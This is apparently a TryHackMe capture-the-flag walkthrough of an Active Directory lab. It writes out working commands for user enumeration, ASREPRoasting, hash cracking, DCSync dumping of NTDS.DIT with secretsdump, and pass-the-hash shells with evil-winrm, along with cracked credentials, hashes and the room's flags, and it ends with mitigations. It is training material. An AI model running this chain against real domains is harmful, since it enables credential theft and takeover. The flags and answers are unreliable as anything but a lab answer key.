# Attacktive Directory - TryHackMe Walkthrough

> **Room:** https://tryhackme.com/room/attacktivedirectory  
> **Difficulty:** Medium  
> **OS:** Windows  
> **Rating:** 3/5

---

## Overview

99% of Corporate networks run off of Active Directory (AD). But can you exploit a vulnerable Domain Controller?

This room teaches the fundamentals of attacking Windows Active Directory environments, covering:
- SMB enumeration
- Kerberos user enumeration
- ASREPRoasting attacks
- Credential cracking
- Pass-the-Hash attacks
- NTDS.DIT dumping

**Target IP:** `10.48.135.14`

---

## Table of Contents

1. [Room Overview](#room-overview)
2. [Reconnaissance](#reconnaissance)
3. [Task 3: Enumeration - Welcome to Attacktive Directory](#task-3-enumeration--welcome-to-attacktive-directory)
4. [Task 4: Enumeration - Enumerating Users via Kerberos](#task-4-enumeration---enumerating-users-via-kerberos)
5. [Task 5: Exploitation - Kerberoasting](#task-5-exploitation---kerberoasting)
6. [Task 6: Enumeration - Back to the Basics](#task-6-enumeration---back-to-the-basics)
7. [Task 7: Privilege Escalation](#task-7-privilege-escalation)
8. [Flag Submission](#flag-submission)
9. [Mitigation Recommendations](#mitigation-recommendations)

---

## Room Overview

### Prerequisites

Required tools for this room:
- **BloodHound & Neo4j** - Active Directory enumeration and visualization
- **Impacket** - Collection of Python classes for working with network protocols
- **Kerbrute** - Kerberos username enumerator

### Network Overview

The target is a Windows Server running Active Directory with the following domain:
- **Domain:** `spookysec.local`
- **NetBIOS Name:** `THM-AD`
- **Hostname:** `AttacktiveDirectory`

---

## Reconnaissance

### Initial Nmap Scan

```bash
nmap -sV -sC -T4 -p- 10.48.135.14
```

**Open Ports Identified:**
| Port | Service | Description |
|------|---------|-------------|
| 53 | DNS | Domain Name System |
| 80 | HTTP | Microsoft HTTPAPI |
| 139 | NetBIOS | SMB naming service |
| 389 | LDAP | Lightweight Directory Access Protocol |
| 445 | SMB | Server Message Block |
| 636 | LDAPS | LDAP over SSL |
| 464 | Kerberos | Password change service |
| 3268 | Global Catalog | Active Directory |
| 5985 | WinRM | Windows Remote Management |
| 3389 | RDP | Remote Desktop Protocol |

**Key Observations:**
- This is a Domain Controller
- SMB and LDAP are exposed
- WinRM is available for remote management

---

## Task 3: Enumeration - Welcome to Attacktive Directory

### Q1: What tool will allow us to enumerate port 139/445?

**Answer:** `enum4linux`

Ports 139 and 445 are used for SMB (Server Message Block). `enum4linux` is a tool for enumerating information from Windows machines using SMB.

```bash
enum4linux -U -M 10.48.135.14
```

### Q2: What is the NetBIOS-Domain Name of the machine?

**Answer:** `THM-AD`

From the enum4linux output:
```
Domain Name: THM-AD
Domain: spookysec.local
```

### Q3: What invalid TLD do people commonly use for their Active Directory Domain?

**Answer:** `.local`

The `.local` TLD is commonly used for internal Active Directory domains, but it's actually reserved for mDNS (multicast DNS) and can cause issues. The proper TLD for internal domains would be a registered domain name.

---

## Task 4: Enumeration - Enumerating Users via Kerberos

### Kerberos Overview

Kerberos is the default authentication protocol for Windows Active Directory. It uses UDP/TCP port 88 for authentication.

### Installing Kerbrute

```bash
# Install Go first, then:
go install github.com/ropnop/kerbrute@latest

# Or download precompiled binary
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64
```

### Q1: What command within Kerbrute will allow us to enumerate valid usernames?

**Answer:** `userenum`

The `userenum` command enumerates valid Active Directory usernames by attempting Kerberos pre-authentication.

```bash
./kerbrute userenum --dc 10.48.135.14 -d THM-AD userlist.txt
```

### Downloading User List

```bash
wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
```

### Q2: What notable account is discovered?

**Answer:** `svc-admin`

The `svc-admin` account stands out as a service account with elevated privileges.

### Q3: What is the other notable account discovered?

**Answer:** `backup`

The `backup` account is notable because it typically has special permissions for backing up the Domain Controller, often including the ability to read sensitive files.

---

## Task 5: Exploitation - Kerberoasting

### Understanding ASREPRoasting

ASREPRoasting is an attack on Kerberos accounts that have the "Do not require Kerberos preauthentication" (`UF_DONT_REQUIRE_PREAUTH`) flag set.

When pre-authentication is disabled:
1. An attacker can send a request for authentication
2. The KDC (Key Distribution Center) returns an encrypted TGT (Ticket Granting Ticket)
3. This TGT can be captured and cracked offline

### Q1: We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?

**Answer:** `svc-admin`

Using `impacket-GetNPUsers`, we can query tickets for users with `UF_DONT_REQUIRE_PREAUTH` set:

```bash
impacket-GetNPUsers -outputfile kerb-hashes.txt -usersfile userlist.txt -dc-ip 10.48.135.14 THM-AD/
```

### Q2: Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC?

**Answer:** `Kerberos 5, etype 23, AS-REP`

The hash format is:
```
$krb5asrep$23$user@domain:salt$encrypted_timestamp
```

### Cracking the Hash

**Using Hashcat:**

```bash
# Identify hash type
hashid -m hash.txt

# Crack using mode 18200 (Kerberos 5, etype 23, AS-REP)
hashcat -m 18200 hash.txt wordlist.txt
```

**Cracked Password:** `management2005`

---

## Task 6: Enumeration - Back to the Basics

Now that we have credentials for `svc-admin`, let's enumerate SMB shares.

### Q1: What utility can we use to map remote SMB shares?

**Answer:** `smbclient`

### Q2: Which option will list shares?

**Answer:** `-L`

```bash
smbclient -L //10.48.135.14 -U svc-admin
```

### Q3: How many remote shares is the server listing?

**Answer:** `6`

### Q4: There is one particular share that we have access to that contains a text file. Which share is it?

**Answer:** `backup`

### Q5: What is the content of the file?

**Answer:** `YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw`

Decoding the base64:
```
backup@spookysec.local:backup2517860
```

```bash
# Access the backup share
smbclient //10.48.135.14/backup -U svc-admin

# Download and read the file
get backup_credentials.txt
```

---

## Task 7: Privilege Escalation

Now we have the backup account credentials. The backup account has special privileges that allow it to dump the NTDS.DIT file, which contains all password hashes in the domain.

### Q1: What method allowed us to dump NTDS.DIT?

**Answer:** `DRSUAPI`

The Directory Replication Service API (DRSUAPI) is used by Active Directory for replication and can be exploited to dump the NTDS.DIT database.

### Using Impacket SecretsDump

```bash
# Dump NTDS.DIT using backup credentials
impacket-secretsdump -just-dc backup@spookysec.local:backup2517860@10.48.135.14
```

This will extract:
- NTLM hashes for all users
- Password history
- Kerberos keys

### Key Hashes Retrieved

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
svc-admin:1000:aad3b435b51404eeaad3b435b51404ee:...
backup:1103:aad3b435b51404eeaad3b435b51404ee:...
```

### Q2: What is the Administrator's NTLM hash?

**Answer:** `0e0363213e37b94221497260b0bcb4fc`

### Q3: What method of attack could allow us to authenticate as the user without the password?

**Answer:** `Pass the Hash`

Pass-the-Hash (PtH) allows authentication using the NTLM hash instead of the plaintext password.

### Q4: Using a tool called Evil-WinRM what option will allow us to use a hash?

**Answer:** `-H`

---

## Flag Submission

### Connecting as Administrator

Using Evil-WinRM with the Administrator's NTLM hash:

```bash
evil-winrm -i 10.48.135.14 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

### Retrieving Flags

| User          | Flag Location                             | Flag                               |
| ------------- | ----------------------------------------- | ---------------------------------- |
| svc-admin     | `C:\Users\svc-admin\Desktop\user.txt`     | `TryHackMe{K3rb3r0s_Pr3_4uth}`     |
| backup        | `C:\Users\backup\Desktop\PrivEsc.txt`     | `TryHackMe{B4ckM3UpSc0tty!}`       |
| Administrator | `C:\Users\Administrator\Desktop\root.txt` | `TryHackMe{4ctiveD1rectoryM4st3r}` |

### Accessing svc-admin Flag

```bash
# Using the cracked password
evil-winrm -i 10.48.135.14 -u svc-admin -p management2005

# Read flag
type C:\Users\svc-admin\Desktop\user.txt
```

### Accessing backup Flag

```bash
# Using the backup credentials
evil-winrm -i 10.48.135.14 -u backup -p backup2517860

# Read flag
type C:\Users\backup\Desktop\PrivEsc.txt
```

### Accessing Administrator Flag

```bash
# Using Pass-the-Hash
evil-winrm -i 10.48.135.14 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc

# Read flag
type C:\Users\Administrator\Desktop\root.txt
```

---

## Attack Chain Summary

```
┌─────────────────────────────────────────────────────────────────┐
│                    ATTACK CHAIN SUMMARY                         │
└─────────────────────────────────────────────────────────────────┘

1. RECONNAISSANCE
   └─> Nmap scan → Identify AD services (SMB, LDAP, Kerberos)

2. SMB ENUMERATION  
   └─> enum4linux → Get NetBIOS domain (THM-AD)

3. KERBEROS USER ENUMERATION
   └─> kerbrute userenum → Discover valid users (svc-admin, backup)

4. ASREPROAST ATTACK
   └─> impacket-GetNPUsers → Extract TGT for svc-admin

5. HASH CRACKING
   └─> hashcat → Crack password (management2005)

6. SMB ENUMERATION (with svc-admin)
   └─> smbclient → Access backup share → Find credentials

7. NTDS.DIT DUMP
   └─> impacket-secretsdump → Extract all user hashes

8. PRIVILEGE ESCALATION
   └─> Pass-the-Hash + Evil-WinRM → Admin shell

9. FLAG COLLECTION
   └─> Retrieve flags from svc-admin, backup, Administrator
```

---

## Mitigation Recommendations

### 1. Kerberoasting Mitigation

**Problem:** ASREPRoasting exploits accounts with "Do not require preauthentication" enabled.

**Solutions:**
- Disable `UF_DONT_REQUIRE_PREAUTH` for all user accounts
- Enforce strong passwords (minimum 14+ characters)
- Monitor Event ID 4768 (Kerberos TGT requested) for anomalies

### 2. SMB Security

**Solutions:**
- Restrict SMB access using firewall rules
- Disable SMBv1 (vulnerable to man-in-the-middle attacks)
- Use SMB signing to prevent relay attacks

### 3. Service Account Security

**Problem:** Service accounts like `svc-admin` and `backup` have elevated privileges.

**Solutions:**
- Follow principle of least privilege
- Regularly audit service account permissions
- Use Managed Service Accounts (MSAs)

### 4. Credential Protection

**Solutions:**
- Implement Credential Guard
- Enable Windows Defender Credential Guard
- Use Protected Security Identifiers (SIDs)
- Rotate passwords regularly

### 5. Monitoring & Detection

**Key Event IDs to Monitor:**
| Event ID | Description |
|----------|-------------|
| 4768 | Kerberos TGT requested |
| 4769 | Kerberos service ticket requested |
| 4776 | NTLM authentication attempted |
| 4624 | Successful logon |
| 4625 | Failed logon |

### 6. Pass-the-Hash Mitigation

**Solutions:**
- Enable Credential Guard
- Use Windows Hello for Business
- Implement Restricted Admin Mode
- Monitor for suspicious lateral movement

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service enumeration |
| enum4linux | SMB enumeration |
| kerbrute | Kerberos user enumeration |
| impacket-GetNPUsers | ASREPRoasting |
| hashcat | Password cracking |
| smbclient | SMB share access |
| impacket-secretsdump | NTDS.DIT dumping |
| Evil-WinRM | Remote shell access |

---

